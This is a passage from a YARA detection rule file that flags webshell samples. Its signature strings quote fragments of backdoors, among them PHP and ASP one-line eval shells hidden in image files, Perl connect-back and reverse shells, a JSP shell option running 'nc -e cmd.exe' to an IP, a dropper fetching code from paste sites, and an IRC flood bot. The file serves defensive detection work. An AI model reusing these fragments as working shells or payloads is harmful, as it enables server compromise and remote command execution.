        $s20 = "<table><tr><td><%If Request.Form(\"chkXML\") = \"on\"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9f8579c07e00872b4f70bfc6ecddc78435bc213b
{
    meta:
        description = "others - file 9f8579c07e00872b4f70bfc6ecddc78435bc213b.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "cebe989d079289f1abf9a3f432ef78d9a9cec8ab8791624c5391cbf559cfc5c9"
    strings:
        $s1 = "echo --==Userinfo==--; id;echo;echo --==Directory==--; pwd;echo; echo --==Shell==-- \"); " fullword ascii
        $s2 = "print \"--== ConnectBack Backdoor Shell EDITED BY XORON TURK?SH HACKER ==-- \\n\\n\"; " fullword ascii
        $s3 = "print \"--== ConnectBack Backdoor Shell EDITED BY XORON TURK?SH HACKER ==--  \\n\\n\"; " fullword ascii
        $s4 = "#--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==-- " fullword ascii
        $s5 = "socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print \"[-] Unable to Resolve Host\\n\"; " fullword ascii
        $s6 = "#--== ConnectBack Backdoor Shell EDITED BY XORON TURK?SH HACKER ==-- " fullword ascii
        $s7 = "connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print \"[-] Unable to Connect Host\\n\"; " fullword ascii
        $s8 = "print \"[*] Spawning Shell \\n\"; " fullword ascii
        $s9 = "print \"[*] Connected to remote host \\n\"; " fullword ascii
        $s10 = "print \"Usage: $0 [Host] [Port] \\n\\n\"; " fullword ascii
        $s11 = "system(\"unset HISTFILE; unset SAVEHIST;echo --==Systeminfo==--; uname -a;echo; " fullword ascii
        $s12 = "#[*] Spawning Shell " fullword ascii
        $s13 = "#[*] Connected to remote host " fullword ascii
        $s14 = "#Usage: dc.pl [Host] [Port] " fullword ascii
        $s15 = "#connect to [127.0.0.1] from localhost [127.0.0.1] 32769 " fullword ascii
        $s16 = "#uid=1001(xoron) gid=100(users) groups=100(users) " fullword ascii
        $s17 = "#lord@SlackwareLinux:/home/programing$ perl dc.pl 127.0.0.1 2121 " fullword ascii
        $s18 = "#Linux SlackwareLinux 2.6.7 #1 SMP Thu Dec 23 00:05:39 IRT 2004 i686 unknown unknown GNU/Linux " fullword ascii
        $s19 = "#bash-2.05b# nc -vv -l -p 2121 " fullword ascii
        $s20 = "#--==Shell==-- " fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 5KB and ( 8 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_others_11
{
    meta:
        description = "others - file 11.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "733f3e2002234e33de59f741ebc0bd5b5d6fe2670f5dab4d0f4c540252daad93"
    strings:
        $s1 = "$text2 = http_get('https://hastebin.com/raw/kuvuyisije');" fullword ascii
        $s2 = "$text = http_get('https://hastebin.com/raw/kuvuyisije');" fullword ascii
        $s3 = "$text3 = http_get('https://pastebin.com/raw/Yban6vjw');" fullword ascii
        $s4 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/wp-includes/wp-footer.php\" ;" fullword ascii
        $s5 = "$check2 = $_SERVER['DOCUMENT_ROOT'] . \"/wp-admin/shapes.php\" ;" fullword ascii
        $s6 = "function http_get($url){" fullword ascii
        $s7 = "return curl_exec($im);" fullword ascii
        $s8 = "$check3=$_SERVER['DOCUMENT_ROOT'] . \"/def.html\" ;" fullword ascii
        $s9 = "curl_setopt($im, CURLOPT_HEADER, 0);" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 3KB and ( all of them ) ) or ( all of them )
}

rule sig_4a7b91db33ffeb8af40f63614e895a35deecc7af
{
    meta:
        description = "others - file 4a7b91db33ffeb8af40f63614e895a35deecc7af.ascx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0bf64b5a5c24a8404369ce94a452aaa3a440c2562bb752ba1257eb69b50afcce"
    strings:
        $s1 = "<asp:Button ID=\"Write\" runat=\"server\" Text=\"Write\" OnClick=\"WriteShell\"/>" fullword ascii
        $s2 = "System.IO.File.WriteAllText(HttpContext.Current.Request.PhysicalPath+\".aspx\",\"test by wooyun\");" fullword ascii
        $s3 = "public void WriteShell(object sender,EventArgs e)" fullword ascii
    condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule dc670de64eb1b42df4fff9bb1865d125261d5848
{
    meta:
        description = "others - file dc670de64eb1b42df4fff9bb1865d125261d5848.cdx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bfb0bed4c77462c5442c0cdae6703b217579e1221cf970ea3273fa41957b1142"
    strings:
        $s1 = "<%=\"<input name='pass' type='password' size='10'> <input \"%><%=\"type='submit' value='" fullword ascii
        $s2 = "<%=\"<center><br><form action='' method='post'>\"%>" fullword ascii
        $s3 = "set fso=server.createobject(\"scripting.filesystemobject\")" fullword ascii
        $s4 = ":\"&server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s5 = "<%=\"<form action='' method=post>\"%>" fullword ascii
        $s6 = "if request(\"pass\")=\"g\" then  '" fullword ascii
        $s7 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
        $s8 = "<%=\"<textarea name=da cols=50 rows=10 width=30></textarea>\"%>" fullword ascii
    condition:
        ( uint16(0) == 0x6967 and filesize < 3KB and ( all of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_others_1_asp_1
{
    meta:
        description = "others - file 1.asp;1.doc"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c5d7e274ed454e3d85dc2465aaf870db89a4432674956264632c8f55186cffb5"
    strings:
        $s1 = "<%=\"<input name='pass' type='password' size='10'> <input \"%><%=\"type='submit' value='" fullword ascii
        $s2 = "<%=\"<center><br><form action='' method='post'>\"%>" fullword ascii
        $s3 = "set fso=server.createobject(\"scripting.filesystemobject\")" fullword ascii
        $s4 = ":\"&server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s5 = "<%=\"<form action='' method=post>\"%>" fullword ascii
        $s6 = "if request(\"pass\")=\"g\" then  '" fullword ascii
        $s7 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
        $s8 = "<%=\"<textarea name=da cols=50 rows=10 width=30></textarea>\"%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( all of them ) ) or ( all of them )
}

rule d1b0dbb902a0c45bbd93cb8d0aad5583fd09deb4
{
    meta:
        description = "others - file d1b0dbb902a0c45bbd93cb8d0aad5583fd09deb4.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3acad13063c7af3dc9ffc169be8f52f8e0829d5b2bffe1a70cba9e4d459caf48"
    strings:
        $s1 = "#   (Server is based on some code found on [url=http://www.governmentsecurity.org)]www.governmentsecurity.org)[/url]" fullword ascii
        $s2 = "print \"Asmodeus Perl Remote Shell\\n\";" fullword ascii
        $s3 = "bind(SERVER, sockaddr_in($port, INADDR_ANY)) or die \"bind: $!\";" fullword ascii
        $s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword ascii
        $s5 = "#   Perl Remote Shell" fullword ascii
        $s6 = "socket(TO_SERVER, PF_INET, SOCK_STREAM, getprotobyname('tcp'));" fullword ascii
        $s7 = "connect(TO_SERVER, $paddr) or die \"$port:$internet_addr:$!\\n\";" fullword ascii
        $s8 = "setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, pack(\"l\", 1)) or die \"setsockopt: $!\";" fullword ascii
        $s9 = "listen(SERVER, SOMAXCONN) or die \"listen: $!\";" fullword ascii
        $s10 = "#   perl asmodeus.pl client 6666 127.0.0.1" fullword ascii
        $s11 = "$system='/bin/sh';" fullword ascii
        $s12 = "$paddr=sockaddr_in(\"$port\", $internet_addr);" fullword ascii
        $s13 = "system(\"/bin/sh\");" fullword ascii
        $s14 = "socket(SERVER, PF_INET, SOCK_STREAM, $proto) or die \"socket:$!\";" fullword ascii
        $s15 = "$proto=getprotobyname('tcp');" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule sig_448a68c8ac8a7e6cc7172a90db747b59a37c6ccc
{
    meta:
        description = "others - file 448a68c8ac8a7e6cc7172a90db747b59a37c6ccc.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f7df59c5d65ed5c109b0ff263da02d6da764643963fb4ccdb82cf8a05efbca9f"
    strings:
        $s1 = "<%execute(request(\"HUCXSZ\"))%>" fullword ascii
        $s2 = "<% @Page Language=\"Jscript\"%><%eval(Request.Item[\"HUCXSZ\"],\"unsafe\");%>" fullword ascii
        $s3 = "Q<?php eval($_POST[HUCXSZ]);?>" fullword ascii
    condition:
        ( uint16(0) == 0xd8ff and filesize < 20KB and ( all of them ) ) or ( all of them )
}

rule sig_61d0434c0ba2bb815a20c5878f9c1ee672b9f61e
{
    meta:
        description = "others - file 61d0434c0ba2bb815a20c5878f9c1ee672b9f61e.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3e9c4aea7f12cfe9834e5cfa08628767ea22f02b22635afd736d45a70b3962e4"
    strings:
        $x1 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
        $x2 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"+" fullword ascii
        $x3 = "Process pro = Runtime.getRuntime().exec(command);" fullword ascii
        $x4 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
        $x5 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"+" fullword ascii
        $x6 = "cmd = \"cmd.exe /c set\";" fullword ascii
        $s7 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
        $s8 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
        $s9 = "//((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
        $s10 = "Process pro = Runtime.getRuntime().exec(program);" fullword ascii
        $s11 = "Process process = Runtime.getRuntime().exec(program);" fullword ascii
        $s12 = "ins.put(\"executesql\",new ExecuteSQLInvoker());" fullword ascii
        $s13 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
        $s14 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
        $s15 = "StreamConnector.readFromLocal(new DataInputStream(targetS.getInputStream()),new DataOutputStream(yourS.getOutputStream()));" fullword ascii
        $s16 = "<option value='reg query \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\RealVNC\\\\WinVNC4\\\" /v \\\"password\\\"'>vnc hash</option>\"+" fullword ascii
        $s17 = "(new StreamConnector(process.getErrorStream(), socket.getOutputStream())).start();" fullword ascii
        $s18 = "Object obj = ((DBOperator)dbo).execute(sql);" fullword ascii
        $s19 = "((Invoker)ins.get(\"vPortScan\")).invoke(request,response,JSession);" fullword ascii
        $s20 = "ins.put(\"vLogin\",new VLoginInvoker());" fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_others_adshell
{
    meta:
        description = "others - file adshell.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ec30c50304f4898ff39e7124d3a357ca50291239ae22e57acd83cd01a699436c"
    strings:
        $s1 = "$text = http_get('https://hastebin.com/raw/kuvuyisije');" fullword ascii
        $s2 = "$text3 = http_get('https://pastebin.com/raw/Yban6vjw');" fullword ascii
        $s3 = "echo \"done mister spy cloud.php .\\n \" ;" fullword ascii
        $s4 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/cloud.php\" ;" fullword ascii
        $s5 = "function http_get($url){" fullword ascii
        $s6 = "echo \"done mister spy def.html .\\n \" ;" fullword ascii
        $s7 = "return curl_exec($im);" fullword ascii
        $s8 = "echo \"done mister spy .\\n \" ;" fullword ascii
        $s9 = "$check3=$_SERVER['DOCUMENT_ROOT'] . \"/def.html\" ;" fullword ascii
        $s10 = "curl_setopt($im, CURLOPT_HEADER, 0);" fullword ascii
        $s11 = "cloud.php" fullword ascii
    condition:
        ( uint16(0) == 0x6c63 and filesize < 2KB and ( 8 of them ) ) or ( all of them )
}

rule f0d08466f350efb72a2df98b01d8cdff04099234
{
    meta:
        description = "others - file f0d08466f350efb72a2df98b01d8cdff04099234.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e5ecb5cf2957f2449bea8a20ed4e748f97945bdc26969c27d0cb0cec8cc7dea0"
    strings:
        $s1 = "# This script will make an outbound TCP connection to a hardcoded IP and port." fullword ascii
        $s2 = "exec({\"/bin/sh\"} ($fake_process_name, \"-i\"));" fullword ascii
        $s3 = "# perl-reverse-shell - A Reverse Shell implementation in PERL" fullword ascii
        $s4 = "# The recipient will be given a shell running as the current user (apache normally)." fullword ascii
        $s5 = "my $fake_process_name = \"/usr/sbin/apache\";" fullword ascii
        $s6 = "# Make TCP connection for reverse shell" fullword ascii
        $s7 = "cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\");" fullword ascii
        $s8 = "# Where to send the reverse shell.  Change these." fullword ascii
        $s9 = "# This tool may be used for legal purposes only.  Users take full responsibility" fullword ascii
        $s10 = "# Background and dissociate from parent process if required" fullword ascii
        $s11 = "# Change the process name to be less conspicious" fullword ascii
        $s12 = "cgiprint(\"Sent reverse shell to $ip:$port\");" fullword ascii
        $s13 = "# Copyright (C) 2006 pentestmonkey@pentestmonkey.net" fullword ascii
        $s14 = "cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\");" fullword ascii
        $s15 = "# Redirect STDIN, STDOUT and STDERR to the TCP connection" fullword ascii
        $s16 = "# source IP can access the reverse shell" fullword ascii
        $s17 = "# for any actions performed using this tool.  The author accepts no liability" fullword ascii
        $s18 = "# Form HTTP response using all the messages gathered by cgiprint so far" fullword ascii
        $s19 = "# it under the terms of the GNU General Public License version 2 as" fullword ascii
        $s20 = "# You are encouraged to send comments, improvements or suggestions to" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_others_xasp_
{
    meta:
        description = "others - file xasp;.gif"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "36b40746e03ec3df1369e175e328d8fc9b7ac20fc2102bd7265780ce71c1265d"
    strings:
        $s1 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
        $s2 = "\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"><xmp:CreatorTool>Microsoft Windows Phot" ascii
        $s3 = "ewer 6.1.7600.16385</xmp:CreatorTool></rdf:Description></rdf:RDF></x:xmpmeta>" fullword ascii
        $s4 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
    condition:
        ( uint16(0) == 0xd8ff and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_18aaebdfbdb6042377b0dc963ef9b7b261ce09f5
{
    meta:
        description = "others - file 18aaebdfbdb6042377b0dc963ef9b7b261ce09f5.asa"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8a8e1eb6ddb8fb32e389b509e9fc6ffc5b49e512a9b444436adf2817ca07906a"
    strings:
        $s1 = "d~kYlMO2Wk~Ax[nGd /OlMOwK/bb@#@&+U[,0;x1ObWU@#@&6Ex1YbGx,onY6NCOm`#@#@&d9k:,s2NmYm`q#@#@&i/OlMOwK/xr" fullword ascii
        $s2 = "/F{rU/8[^w./cs.kRF* xm:n'r~J@#@&id7dbW,/nk/bWxvJ&dHGAE#{F~O4+x@#@&diddirU/y'bxd 'EE!v~r@#@&id77" fullword ascii
        $s3 = "`J1hNalY4Eb[rPLPE[d\";H9@#@&7/.Z\\9{/+ddbWU`r^sN[M\\r#[rPL~JL/\"Ztf@#@&@#@&dbWPH6@!@*EGxrPDtnx@#@&idAWM[/{hdsc+6n^vJ^:9 " fullword ascii
        $s4 = "r[84W@#@&+^tK~J9W^;s+xO mVsRk5^/OMR7lV!+{dir[846@#@&n1tW,E8@!z/1.rwD@*r[84W@#@&+^tK~J@!/^.bwY~smxLEmL" fullword ascii
        $s5 = "dYvJ;D^Jb@#@&/+M-+MR/1.rwDKb:nW;O{FT!ZT!@#@&886'm4.vFf#L^4Dc8!*@#@&@#@&@#@&+1tGPr@!OrDV+@*d;^/+M-nD" fullword ascii
        $s6 = "PU+XY@#@&ik0,./cD+1G.N1W!xO@!q~Dtnx,n6bY~W!xmOrKx@#@&iWKD~9N{FPDW,./cDnmKD[^KExD@#@&idwMG^/DD{w.W^dDD'Dkc!*R-C^E+@#@&id./chK\\n" fullword ascii
        $s7 = "mOkKUkY.bxTJ#@#@&m[W1WUxcm;.kWD^GmmYkKUx&@#@&b0~/ndkkGxvEqkH9$r#'T~Dtnx,C9W^Kx" fullword ascii
        $s8 = "/SZUOD~`886[48W*#Qc@#@&i2U9nK/'bxkOD(`dYmDO2K/~^UAHY+kSjkTx*O+@#@&7T+O09CYm'cdDlDO2K/RF*'r~EL`AxNhWkR/Dl.YaWdb@#@&+" fullword ascii
        $s9 = ".+,$rNY'11O,,EI8@!z/1.rwD@*r@#@&dn^4W~J@!dmMk2O@*0EU^DkGx,[MW2v#PNW1EsnxDRCV^Rd5^/YM \\mVE" fullword ascii
        $s10 = "Z'Z4.vbd1AvY:aAbU#*@#@&dAx[~&0@#@&72^/+@#@&7/0ka0slLxZ@#@&dAUN,qW@#@&d1naD@#@&dAU9P(6@#@&dADWU~P{P~/DD/@#@&2x9~PwEx1OrW" fullword ascii
        $s11 = "Uls+cb@#@&ddOmDOwKd{kUkYM4`8~^UAHYn/BZdOMA`rWk^+xmhn'r[1t.`f**#b_8T@#@&drW,/YC.DwG/@!+,Y4" fullword ascii
        $s12 = "c2~r@!r~E7@!E*@#@&di2'M+2smm+c2BJ@*JBE%@*E*@#@&ddam4CD{Dro4Yc2BF#@#@&dik0,2^tmD@*'E!E~mx[Pa^tmD@!xr,J~O4+UPax^+WD`a~V" fullword ascii
        $s13 = "6Y@#@&knD7+.Rkm.raYYbh+KEY{11,O,O,1@#@&W!x^YbGx,+^4K`V2dDDb)MnkwG" fullword ascii
        $s14 = "0{B%l-Ckm.kaO)1wzc'JJEE3Dnw^C1+c6w8~Jr-'EJBJEzrJbQ^w/D._rJ-rEbB@*" fullword ascii
        $s15 = "U@#@&dW/conO6WV9nDv0w8b lDYMk8EOnk'+ @#@&d^DxE]R?4n^V/VmdkqU6WYJ_(46QJ;SjqG'`" fullword ascii
        $s16 = "Y@#@&77VakD+h'~E@!Y.@*@!ON@*J'[9[J@!&DN@*J@#@&id;aNmY+{JDOJLN[[r'E'1tDvfc*[J!2[lD+,J'/ndkkGxvEN(WEbLYl8s" fullword ascii
        $s17 = "m~slkY+MR98Wc62{1:[d4+V^~Br[D!Ud;^/v3b[Evr@#@&@#@&7di+U[,k0@#@&id7+14KP.!xk;Vk`0b[rORO J'E@!4D@*E@#@&ddirWP^+" fullword ascii
        $s18 = "P,JLsaDdvV.LO8#cUls+'JY'E'kD/vswM/`^\"%O8#c\\CV;n*@#@&di7\\DX2n{Vw.dvV\"L q*ROHw" fullword ascii
        $s19 = "@#@&dOhaArx{\\k9Ac8bx/O.Bka~8b@#@&7&0,b/1AvO:aArx*@*q+FPK4nx@#@&dkO.Z{/DD/[/4M`)/1" fullword ascii
        $s20 = "'JrJLd+^0'JQmx0RvJr@*+XkY@!&dwmx@*TE[886@#@&+14W,J@!d1Dk2O@*0;x1ObWU,mM+lD+Dc#PNGm!:nUDRl^sRk;VkO.R7l^En'v^M+CY" fullword ascii
    condition:
        ( uint16(0) == 0x4f3c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule sig_92c366919af64bf743502605d570e2ecc3da996f
{
    meta:
        description = "others - file 92c366919af64bf743502605d570e2ecc3da996f.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "22e89d9246803315ba60ead7b69371ba2a341805ad42e765d9dd1bb7503b6ba7"
    strings:
        $x1 = "use vars qw($LOGIN_TEMPLATE $INPUT_TEMPLATE $EXECUTE_TEMPLATE $BROWSE_TEMPLATE);" fullword ascii
        $s2 = "var entry = document.forms.execute.elements['command'];" fullword ascii
        $s3 = "<iframe name=\"output\" src=\"WebShell.cgi?action=execute\" width=\"80%\" height=\"80%\"></iframe>" fullword ascii
        $s4 = "<form name=\"execute\" action=\"WebShell.cgi\" method=\"POST\" target=\"output\">" fullword ascii
        $s5 = "<td><input class=\"tool\" type=\"submit\" value=\"Execute\" onClick=\"return submit_execute()\"></td>" fullword ascii
        $s6 = "if crypt($WebShell::Configuration::password, $login.\"XX\") eq $login;" fullword ascii
        $s7 = "print $self->{cgi}->header(-cookie => [$cwd_cookie, $login_cookie]);" fullword ascii
        $s8 = "<tr><td class=\"footer\"><h5>Copyright &copy; 2003 <a href=\"http://www.gammacenter.com/\">Gamma Group</a></h5></td></tr>" fullword ascii
        $s9 = "<tr><td class=\"footer\"><h5>Copyright &copy; 2003 <a href=\"http://www.gammacenter.com/\">Gamma Group</a></h5></td></tr" fullword ascii
        $s10 = "### prior consent from Gamma Group (support@gammacenter.com)." fullword ascii
        $s11 = "$self->{login} = 1 if $password eq $WebShell::Configuration::password;" fullword ascii
        $s12 = "document.forms.execute.elements['action'].value = 'browse';" fullword ascii
        $s13 = "document.forms.execute.elements['action'].value = 'execute';" fullword ascii
        $s14 = "$error .= \"You may only use the following commands:\\n\";" fullword ascii
        $s15 = "$login = crypt($WebShell::Configuration::password, $salt);" fullword ascii
        $s16 = ".box-header, .box-content, .box-text, .box-error, .box-menu {" fullword ascii
        $s17 = "### Gamma Web Shell is free for both commercial and non commercial" fullword ascii
        $s18 = "### Gamma Group <http://www.gammacenter.com>" fullword ascii
        $s19 = "$self->publish('LOGIN', error => ($self->query('password') ne ''));" fullword ascii
        $s20 = "use vars qw($password $restricted_mode $ok_commands);" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 70KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_42e823fe67061598aa48ada9bfa474f4eb90cfd1
{
    meta:
        description = "others - file 42e823fe67061598aa48ada9bfa474f4eb90cfd1.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "aaf89ef97ed35a8abf2f49c1d5a7b6d08f6ae4f8d9ccb8d2dd2cf8a36492b7e0"
    strings:
        $s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shell==-- \");" fullword ascii
        $s2 = "print \"--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==-- \\n\\n\";" fullword ascii
        $s3 = "socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print \"[-] Unable to Resolve Host\\n\";" fullword ascii
        $s4 = "system(\"unset HISTFILE; unset SAVEHIST ;echo --==Systeminfo==-- ; uname -a;echo;" fullword ascii
        $s5 = "connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print \"[-] Unable to Connect Host\\n\";" fullword ascii
        $s6 = "print \"[*] Spawning Shell \\n\";" fullword ascii
        $s7 = "#--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--" fullword ascii
        $s8 = "print \"[*] Connected to remote host \\n\";" fullword ascii
        $s9 = "print \"Usage: $0 [Host] [Port] \\n\\n\";" fullword ascii
        $s10 = "#[*] Spawning Shell" fullword ascii
        $s11 = "#[*] Connected to remote host" fullword ascii
        $s12 = "print \"--== ConnectBack Backdoor vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--  \\n\\n\";" fullword ascii
        $s13 = "#Email:LorD@ihsteam.com" fullword ascii
        $s14 = "#connect to [127.0.0.1] from localhost [127.0.0.1] 32769" fullword ascii
        $s15 = "#Usage: dc.pl [Host] [Port]" fullword ascii
        $s16 = "#uid=1001(lord) gid=100(users) groups=100(users)" fullword ascii
        $s17 = "#lord@SlackwareLinux:/home/programing$ perl dc.pl 127.0.0.1 2121" fullword ascii
        $s18 = "#Linux SlackwareLinux 2.6.7 #1 SMP Thu Dec 23 00:05:39 IRT 2004 i686 unknown unknown GNU/Linux" fullword ascii
        $s19 = "#bash-2.05b# nc -vv -l -p 2121" fullword ascii
        $s20 = "#IRAN HACKERS SABOTAGE Connect Back Shell          " fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 5KB and ( 8 of them ) ) or ( all of them )
}

rule sig_3900102d204421bac447d3b7ddfd110732f91d33
{
    meta:
        description = "others - file 3900102d204421bac447d3b7ddfd110732f91d33.gif"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "80e98e8a3461d7ba15d869b0641cdd21dd5b957a2006c3caeaf6f70a749ca4bb"
    strings:
        $s1 = "00016f0: 6e40 523c 3f70 6870 696e 666f 2829 3f3e  n@R<?php eval($_POST[xiaoma]);?>" fullword ascii
        $s2 = "0000870: 6e93 9b0a 6568 431b aa81 884a 949c de13  n...ehC....J...." fullword ascii
        $s3 = "0001ad0: 175b c0b4 5da9 a522 c605 0061 83c1 05f7  .[..]..\"...a...." fullword ascii
        $s4 = "00018f0: 040d b162 c58d 193b 564c d931 b4cb 8889  ...b...;VL.1...." fullword ascii
        $s5 = "0000350: 8a74 6810 612c 042c 0722 9849 b3a6 cd9b  .th.a,.,.\".I...." fullword ascii
        $s6 = "00006d0: 5042 1330 603e 7f28 e17c 6933 94db e8f5  PB.0`>.(.|i3...." fullword ascii
        $s7 = "0000f70: 9f0f 70a1 117a a1f2 799b 124a 9ff1 19a2  ..p..z..y..J...." fullword ascii
        $s8 = "0000b70: 2d64 b53f 2044 8207 99f0 8100 ba50 82b6  -d.? D.......P.." fullword ascii
        $s9 = "0000b50: 2d9e f312 e842 c68b 50f7 c743 be83 aa5f  -....B..P..C..._" fullword ascii
        $s10 = "0000a90: 2dd6 1f97 3dd0 8e35 0820 0b22 50c3 1128  -...=..5. .\"P..(" fullword ascii
        $s11 = "00015f0: 5ee6 501e e52c 1e62 1835 7f45 b009 94e0  ^.P..,.b.5.E...." fullword ascii
        $s12 = "00007c0: 5108 50f0 4723 3f55 3149 f66e 8118 a0c1  Q.P.G#?U1I.n...." fullword ascii
        $s13 = "0000e30: 0774 5985 91fa b291 f2c0 0375 9306 8618  .tY........u...." fullword ascii
        $s14 = "0000250: f7e6 b1de c988 fafb fd5e 7171 fdfb f6f7  .........^qq...." fullword ascii
        $s15 = "0001840: fef0 9ffd efdf feda 1f0d f56f fe0a 000f  ...........o...." fullword ascii
        $s16 = "00011d0: b88a abba a3eb b984 3bb8 a66b b8a4 fbb9  ........;..k...." fullword ascii
        $s17 = "0001500: dac5 6dd8 b8bd d99c eddb cb4d dbd2 9ddb  ..m........M...." fullword ascii
        $s18 = "0000f40: 9ff4 299f f319 9fbf 6904 7f70 08c5 f90a  ..).....i..p...." fullword ascii
    condition:
        ( uint16(0) == 0x3030 and filesize < 90KB and ( 8 of them ) ) or ( all of them )
}

rule sig_1ded8770d26dbadd27c70807df5b3f75e4f88856
{
    meta:
        description = "others - file 1ded8770d26dbadd27c70807df5b3f75e4f88856.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ab8521708c6b9b092534d2f1c2b665da18af452ffbf998d0a351dc8150d61f2a"
    strings:
        $s1 = "my $processo = '/usr/local/apache/bin/httpd -DSSL';                       # Nome do processo que vai aparece no ps       #" fullword ascii
        $s2 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002M?dia de envio\\002: \".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + " fullword ascii
        $s3 = "################ ACESSO A SHELL ###############################################################" fullword ascii
        $s4 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total pacotes\\002: \".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp" fullword ascii
        $s5 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total bytes\\002: \".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $by" fullword ascii
        $s6 = "sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");" fullword ascii
        $s7 = "my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);" fullword ascii
